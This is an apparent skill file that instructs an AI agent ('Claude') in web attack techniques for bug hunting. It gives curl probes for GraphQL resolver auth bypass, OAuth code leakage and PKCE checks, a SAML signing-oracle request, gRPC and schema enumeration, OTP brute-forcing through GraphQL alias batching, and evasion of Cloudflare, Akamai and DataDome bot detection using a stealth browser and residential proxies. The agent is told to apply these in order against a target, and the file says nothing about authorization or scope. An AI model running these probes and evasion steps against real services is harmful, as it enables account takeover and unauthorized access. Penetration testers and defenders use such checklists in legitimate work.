# SKILL: Proven Attack Techniques

## Metadata
- **Skill Name**: proven-techniques
- **Folder**: offensive-proven-techniques
- **Source**: pentest-agents rules/techniques.md

## Description
Field-tested attack techniques from real engagements. Covers GraphQL auth bypass, DRF auth semantics, OAuth code leakage, PKCE checks, source map analysis, gRPC method enumeration, GraphQL schema reconstruction, user enumeration, alias batching, SAML signing oracle, bot detection bypass, and more. Reference for all hunting agents.

## Trigger Phrases
Use this skill when the conversation involves any of:
`GraphQL auth, DRF, Django REST, OAuth PKCE, source map, gRPC, clairvoyance, user enumeration, alias batching, SAML oracle, Camoufox, stealth browser, bot detection`

## Instructions for Claude

When this skill is active:
1. Apply the relevant technique checklist for the target technology
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target context
4. Document results for every technique attempted

---

## GraphQL Resolver-Level Auth Bypass

**Pattern**: Authentication is opt-in per resolver, not enforced at the service layer.

**Detection**: Send requests with and without auth header. If responses differ only at the business logic level (not auth level), auth middleware is absent.

```bash
# With no auth:
curl -X POST https://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { dangerousMutation(input: {field: \"test\"}) { success } }"}'

# With fake auth:
curl -X POST https://target/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalidtoken123" \
  -d '{"query":"mutation { dangerousMutation(input: {field: \"test\"}) { success } }"}'

# If BOTH return the same backend error (404, NullReferenceException, business error)
# instead of 401/403 → auth middleware is absent on this resolver
```

**Key insight**: A 401/403 = auth middleware caught it. A backend error = auth was never checked.

## DRF Authentication Semantics Proof

**Pattern**: Django REST Framework enforces auth BEFORE queryset access.

```bash
# Auth-required endpoint: returns 401
curl -s "https://api.target.com/accounts/" → {"detail":"Authentication credentials were not provided."}

# AllowAny endpoint: returns 404 at object lookup
curl -s "https://api.target.com/public-resource/nonexistent-id/" → {"detail":"Not found."}
# 404 at object lookup = auth was bypassed, AllowAny permission class
```

## OAuth Auth Code Leakage to Analytics

**Detection** (no account needed):
```bash
curl -s "https://target.com/callback?code=test_probe&state=test" | grep -iE "gtag|ga4|logrocket|segment|amplitude|mixpanel|heap"
```
**Chain**: Code leak + public client (no secret) + no PKCE → ATO

## PKCE Enforcement Check

```bash
# Without code_verifier: "invalid_grant" = PKCE NOT enforced
# Without code_verifier: "invalid_request: code_verifier required" = PKCE enforced
```
```bash
# Without secret: "invalid_grant" = public client
# Without secret: "invalid_client" = confidential client
```

## Source Map Analysis

```bash
# Check for source maps:
curl -sI "https://target.com/static/js/main.abc123.js.map" | head -1

# Extract and analyze for API clients, auth logic, admin endpoints, secrets
```

## gRPC Method Enumeration via Proxy Errors

Envoy/gRPC-Web proxies leak exact method names in error responses.
```bash
curl -s "https://target.com/v1/accounts/" → reveals: method = /service.v1.Service/AccountList
```

## GraphQL Schema Reconstruction (Clairvoyance)

Apollo Server returns field suggestions for typos, enabling schema reconstruction without introspection.
```bash
{ usr } → "Did you mean \"user\"?"
{ user } → type "ActiveUser" must have subfields
{ user { eml } } → "Did you mean \"email\"?"
```

## User Enumeration via Error Path Divergence

Different internal error paths for valid vs invalid users = enumeration oracle.
Any measurable difference (error message, response time, status code, error path) counts.

## GraphQL Alias Batching (Rate Limit Bypass)

10 OTP attempts in 1 HTTP request. At 100 req/sec = 1000 OTP/sec. 6-digit OTP brute-forced in ~17 minutes.
Rate limiters that count HTTP requests (not GraphQL operations) are bypassed.

## SAML Signing Oracle

SAML IdP endpoint that signs assertions without requiring authentication.
```bash
curl -s -X POST 'https://target.com/saml/sso' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'status={"primaryCode":"urn:oasis:names:tc:SAML:2.0:status:Success"}'
```

## Framework-Specific Auth Detection

### Django REST Framework (DRF)
- 401 with `"detail":"Authentication credentials were not provided."` = auth enforced
- 404 with `"detail":"Not found."` or queryset error = auth bypassed (AllowAny)

### ASP.NET / .NET Core
- `System.ArgumentNullException` or `NullReferenceException` in response = code reached without auth

### Envoy / gRPC-Web Proxy
- 403 responses leak exact gRPC method: `method = /service.v1.Service/MethodName`
- Non-v1 paths may bypass RBAC

### GraphQL (Apollo Server)
- Field suggestions on typos reconstruct schema without introspection
- Alias batching: N mutations per request bypasses per-request rate limits

## OAuth Full Audit Checklist

1. Public client check: POST token endpoint without `client_secret`
2. PKCE enforcement: POST token endpoint without `code_verifier`
3. State parameter: Check if `state` is present in authorize URL
4. Analytics leakage: Check callback page for analytics tags
5. Redirect URI validation: Try variations
6. Chain: code leak + public client + no PKCE = ATO

## Bypassing Bot Detection (CF / Akamai / Google / DataDome)

Vanilla `curl`/`httpx`/chromedriver returns challenges from CDNs. Use Camoufox (Firefox fork patched at C++ level to hide `navigator.webdriver`, spoof WebGL, fakes `hardwareConcurrency`).

**Key insight**: Stealth is invisible to JS detection because it's applied at the C++ implementation level before JavaScript runs. Vanilla Playwright + stealth plugins monkey-patch in JS and get caught by toString inspection.

**Caveat**: Stealth ≠ anonymity. Pair with residential proxy for IP reputation.
